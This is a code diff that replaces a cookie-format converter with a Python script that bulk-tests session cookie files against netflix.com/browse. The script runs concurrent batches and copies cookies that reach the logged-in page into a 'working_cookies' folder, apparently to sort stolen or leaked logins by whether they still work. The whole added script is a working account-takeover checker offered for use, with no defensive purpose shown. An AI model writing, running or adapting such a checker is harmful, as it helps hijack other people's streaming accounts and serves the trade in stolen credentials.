@@ -1,139 +1,119 @@
 import json
 import os
-import random
-import shutil
-import progressbar
+import requests
+import asyncio
+import time
+working_cookies_path = "working_cookies"
+exceptions = 0
+working_cookies = 0
+expired_cookies = 0
 
-try:
-    if os.name == "posix":
-        folder_path = "cookies"
-    else:
-        while True:
-            import tkinter
-            from tkinter import filedialog
+MAX_CONCURRENT_REQUESTS = 4  # Adjust based on your system's capacity
+BATCH_SIZE = 20  # Adjust based on experimentation
 
-            print("\n<<< Select Netscape cookies folder >>>\n\n")
-            tkinter.Tk().withdraw()
-            folder_path = filedialog.askdirectory()
-            if folder_path == "":
-                print("Trying to use default folder 'cookies'\n")
-                folder_path = "cookies"
-                break
+def maximum():
+    count = 0
+    for root_dir, cur_dir, files in os.walk(r"json_cookies"):
+        count += len(files)
+    return count
 
-            else:
-                break
+def load_cookies_from_json(json_cookies_path):
+    with open(json_cookies_path, "r", encoding="utf-8") as cookie_file:
+        cookies_list = json.load(cookie_file)
 
-    def maximum():
-        count = 0
-        for _, _, files in os.walk(folder_path):
-            count += len(files)
-        return count
-
-    rand_number = random.randint(1, 99999)
-
-    progress = 0
-    pbar = progressbar.ProgressBar(maxval=maximum())
-
-    def convert_netscape_cookie_to_json(cookie_file_content):
-        cookies = []
-        for line in cookie_file_content.splitlines():
-            fields = line.strip().split("\t")
-            if len(fields) >= 7:
-                cookie = {
-                    "domain": fields[0].replace("www", ""),
-                    "flag": fields[1],
-                    "path": fields[2],
-                    "secure": fields[3] == "TRUE",
-                    "expiration": fields[4],
-                    "name": fields[5],
-                    "value": fields[6],
-                }
-                cookies.append(cookie)
-
-        json_content = json.dumps(cookies, indent=4)
-        return json_content
-
-    json_folder_path = "json_cookies"
+    # Convert the list of cookies into a dictionary
     try:
-        os.makedirs(json_folder_path, exist_ok=True)
-        print(f"Folder {json_folder_path} created!\n")
-        try:
-            for filename in os.listdir(folder_path):
-                filepath = os.path.join(folder_path, filename)
-                if os.path.isfile(filepath):
-                    with open(filepath, "r", encoding="utf-8") as file:
-                        content = file.read()
+        cookies = {cookie['name']: cookie['value'] for cookie in cookies_list}
+    except (KeyError, TypeError):
+        raise ValueError("Invalid cookie format. Cookies must be a dictionary with 'name' and 'value' fields.")
 
-                    json_data = convert_netscape_cookie_to_json(content)
+    return cookies
 
-                    with open(os.path.join(json_folder_path, filename), "w", encoding="utf-8") as f:
-                        f.write(json_data)
-                        print(f"{filename} - DONE!")
-                        if 0 <= progress <= maximum():
-                            pbar.start()
-                            pbar.update(progress)
-                            progress += 1
-                        else:
-                            pass
-        except FileNotFoundError:
-            print(
-                "Error Occurred: Default 'cookies' folder not found, please select a valid folder"
-            )
-            shutil.rmtree(json_folder_path)
 
-    except FileExistsError:
-        if (
-            input(
-                "Do you want to remove old json_cookies folder? (y/n)\n [y] Recommended \n > : "
-            )
-            == "y"
-        ):
-            shutil.rmtree(json_folder_path)
-            os.makedirs(json_folder_path, exist_ok=True)
-            for filename in os.listdir(folder_path):
-                filepath = os.path.join(folder_path, filename)
-                if os.path.isfile(filepath):
-                    with open(filepath, "r", encoding="utf-8") as file:
-                        content = file.read()
 
-                    json_data = convert_netscape_cookie_to_json(content)
-
-                    with open(os.path.join(json_folder_path, filename), "w", encoding="utf-8") as f:
-                        f.write(json_data)
-                        print(f"{filename} - DONE!")
-                        if 0 <= progress <= maximum():
-                            pbar.start()
-                            pbar.update(progress)
-                            progress += 1
-                        else:
-                            pass
-
+def send_request_with_cookies(url, cookies):
+    try:
+        response = requests.get(url, cookies=cookies)
+        print(f"Response URL: {response.url}, Status Code: {response.status_code}")
+        # Check for 200 OK response for a valid cookie
+        if response.status_code == 200 and "netflix.com/browse" in response.url:
+            return True
+        elif response.status_code == 302:
+            return False
         else:
-            os.makedirs(f"temp {rand_number}", exist_ok=True)
-            for filename in os.listdir(folder_path):
-                filepath = os.path.join(folder_path, filename)
-                if os.path.isfile(filepath):
-                    with open(filepath, "r") as file:
-                        content = file.read()
+            return None
 
-                    json_data = convert_netscape_cookie_to_json(content)
+    except Exception as e:
+        print(f"Error occurred during the request: {str(e)}")
+        return None
 
-                    with open(
-                        os.path.join(f"temp {rand_number}", filename), "w", encoding="utf-8"
-                    ) as f:
-                        f.write(json_data)
-                        print(f"{filename} - DONE!")
-                        if 0 <= progress <= maximum():
-                            pbar.start()
-                            pbar.update(progress)
-                            progress += 1
-                        else:
-                            pass
+def process_cookie(filename):
+    filepath = os.path.join("json_cookies", filename)
 
-            print(f"\n\nSaved cookies to the temp folder - temp {rand_number}")
-    finally:
-        pbar.finish()
+    if os.path.isfile(filepath):
+        with open(filepath, "r", encoding="utf-8") as file:
+            global content
+            content = file.read()
 
-except KeyboardInterrupt:
-    print("\n\nProgram Interrupted by user")
-    exit()
+            url = "https://netflix.com/browse"  
+
+            try:
+                cookies = load_cookies_from_json(filepath)
+                is_valid_cookie = send_request_with_cookies(url, cookies)
+
+                if is_valid_cookie is True:
+                    print(f"Working cookie found! - {filename}")
+                    try:
+                        os.makedirs(working_cookies_path, exist_ok=True)
+                        with open(os.path.join(working_cookies_path, filename), "w", encoding="utf-8") as a:
+                            a.write(content)
+                        global working_cookies
+                        working_cookies += 1
+                    except FileExistsError:
+                        with open(os.path.join(working_cookies_path, filename), "w", encoding="utf-8") as a:
+                            a.write(content)
+                        working_cookies += 1
+                elif is_valid_cookie is False:
+                    print(f"Invalid cookie - {filename}")
+                    global expired_cookies
+                    expired_cookies += 1
+                else:
+                    print(f"Invalid cookiess - {filename}")
+                    global exceptions
+                    exceptions += 1
+
+            except json.decoder.JSONDecodeError:
+                print(f"Please use cookie_converter.py to convert your cookies to json format! (File: {filename})\n")
+                exceptions += 1
+
+async def process_batch_async(filenames):
+    tasks = []
+    for filename in filenames:
+        tasks.append(asyncio.to_thread(process_cookie, filename))
+
+    await asyncio.gather(*tasks)
+
+async def process_cookies_concurrently(filenames):
+    for i in range(0, len(filenames), BATCH_SIZE):
+        batch = filenames[i : i + BATCH_SIZE]
+        await process_batch_async(batch)
+
+async def main():
+    global working_cookies
+    global expired_cookies
+    global exceptions
+
+    start_time = time.time()
+
+    filenames = os.listdir("json_cookies")
+    await process_cookies_concurrently(filenames)
+
+    elapsed_time = time.time() - start_time
+    print(
+        f"\nSummary:\nTotal cookies: {maximum()}\nWorking cookies: {working_cookies}\nExpired cookies: {expired_cookies}\nInvalid cookies: {exceptions}"
+    )
+    print(f"Time taken: {elapsed_time:.2f} seconds")
+
+if __name__ == "__main__":
+    asyncio.run(main())
+    
